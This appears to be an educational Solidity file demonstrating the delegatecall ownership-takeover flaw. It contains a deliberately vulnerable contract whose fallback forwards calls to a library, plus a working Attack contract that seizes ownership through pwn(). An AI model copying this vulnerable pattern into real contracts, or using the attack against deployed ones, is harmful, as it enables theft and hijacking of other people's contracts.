/*
    Imagine you deploy contract 'Lib' & 'getHack'
        => 'getHack' owner = your address
    You want to use delegatecall in your fallback function with msg.data like that to interact 
        with other contract (maybe save time)

    However, Someone deploy Attack & use attack() function => 
        change 'getHack' owner to contract Attack's address
        Reason: storage layout in getHack's owner address get replace by pwn() function in Lib
*/

pragma solidity ^0.8;

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract getHack {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public getHack;

    constructor(address _getHack) {
        getHack = _getHack;
    }

    function attack() public {
        getHack.call(abi.encodeWithSignature("pwn()"));
    }
}